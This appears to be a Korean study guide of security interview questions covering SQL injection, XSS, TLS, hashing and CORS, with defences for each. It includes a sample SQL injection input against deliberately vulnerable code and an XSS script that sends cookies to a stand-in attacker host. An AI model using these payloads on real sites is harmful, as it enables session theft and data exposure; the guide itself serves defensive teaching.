# 보안 면접 질문 & 답변

## 사용 방법
1. 질문을 먼저 읽고 스스로 답변해보세요
2. 답변을 확인하고 부족한 부분을 학습하세요
3. ⭐ 표시는 빈출 질문입니다

---

## Q1. SQL Injection이란 무엇이며, 어떻게 방어하나요? ⭐⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
SQL Injection은 **악의적인 SQL 코드를 삽입**하여 데이터베이스를 조작하는 공격입니다.

### 공격 예시

```sql
-- 취약한 코드
String query = "SELECT * FROM users WHERE id = '" + userId + "'";

-- 공격: userId = "' OR '1'='1"
SELECT * FROM users WHERE id = '' OR '1'='1'  -- 모든 사용자 반환!
```

### 방어 방법

**1. Prepared Statement (권장)**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
stmt.setString(1, userId);
```

**2. ORM 사용**
```java
// JPA - 자동 파라미터 바인딩
userRepository.findById(userId);
```

**3. 입력 검증**
- 화이트리스트 검증
- 특수문자 이스케이프

### 면접관이 주목하는 포인트
- Prepared Statement 원리 이해
- 실제 방어 경험

</details>

---

## Q2. XSS(Cross-Site Scripting)란? ⭐⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
XSS는 **악의적인 스크립트를 웹 페이지에 삽입**하여 사용자 정보를 탈취하는 공격입니다.

### XSS 유형

| 유형 | 설명 |
|------|------|
| Stored XSS | DB에 저장된 스크립트 실행 |
| Reflected XSS | URL 파라미터의 스크립트 반사 |
| DOM-based XSS | 클라이언트 JS로 DOM 조작 |

### 공격 예시

```html
<!-- 사용자 입력 -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### 방어 방법

**1. 출력 이스케이프**
```javascript
// HTML 이스케이프
function escapeHtml(str) {
    return str.replace(/[&<>"']/g, char => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    }[char]));
}
```

**2. CSP (Content Security Policy)**
```http
Content-Security-Policy: script-src 'self'
```

**3. HttpOnly 쿠키**
```http
Set-Cookie: session=abc123; HttpOnly
```

</details>

---

## Q3. HTTPS와 TLS는 무엇인가요? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
HTTPS는 HTTP + TLS로, **통신을 암호화**하여 도청과 변조를 방지합니다.

### TLS 핸드셰이크 (간략)

```
1. Client Hello: 지원 암호화 스위트 전송
2. Server Hello: 암호화 방식 선택, 인증서 전송
3. 클라이언트: 인증서 검증, 세션 키 생성
4. 양방향 암호화 통신 시작
```

### 대칭키 vs 비대칭키

| 구분 | 대칭키 | 비대칭키 |
|------|--------|---------|
| 키 | 하나 (공유) | 공개키 + 개인키 |
| 속도 | 빠름 | 느림 |
| 용도 | 데이터 암호화 | 키 교환, 서명 |

### HTTPS 이점
- 기밀성 (도청 방지)
- 무결성 (변조 감지)
- 인증 (서버 신원 확인)

</details>

---

## Q4. 암호화 vs 해싱의 차이는? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변

| 구분 | 암호화 | 해싱 |
|------|--------|------|
| 가역성 | 복호화 가능 | 불가능 (단방향) |
| 목적 | 기밀성 | 무결성 검증 |
| 용도 | 데이터 보호 | 비밀번호 저장 |

### 비밀번호 저장

```python
# 나쁜 예: 평문 저장
password = "mypassword"

# 나쁜 예: 단순 해시
hash = sha256(password)

# 좋은 예: Salt + 느린 해시 (bcrypt)
hash = bcrypt.hashpw(password, bcrypt.gensalt())
```

### 해싱 알고리즘

| 알고리즘 | 용도 |
|---------|------|
| bcrypt, scrypt, Argon2 | 비밀번호 (느림, 권장) |
| SHA-256 | 파일 무결성 검증 |
| MD5 | 비권장 (취약) |

</details>

---

## Q5. CORS란 무엇인가요? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
CORS(Cross-Origin Resource Sharing)는 **다른 출처의 리소스 접근을 제어**하는 브라우저 보안 정책입니다.

### Same-Origin Policy

```
같은 출처: 프로토콜 + 호스트 + 포트가 동일

https://example.com:443/page
  │         │        │
프로토콜   호스트    포트

https://api.example.com → 다른 출처 (호스트 다름)
```

### CORS 헤더

```http
# 서버 응답
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
```

### Preflight 요청

```
복잡한 요청 전에 OPTIONS 요청으로 허용 여부 확인

1. 브라우저: OPTIONS /api/data
2. 서버: CORS 헤더로 응답
3. 허용되면 실제 요청 전송
```

</details>

---

## 학습 체크리스트

- [ ] SQL Injection 방어 방법 알기
- [ ] XSS 유형과 방어 방법 설명 가능
- [ ] HTTPS/TLS 동작 원리 이해
- [ ] 암호화와 해싱 차이 설명 가능
- [ ] CORS 동작 원리 이해
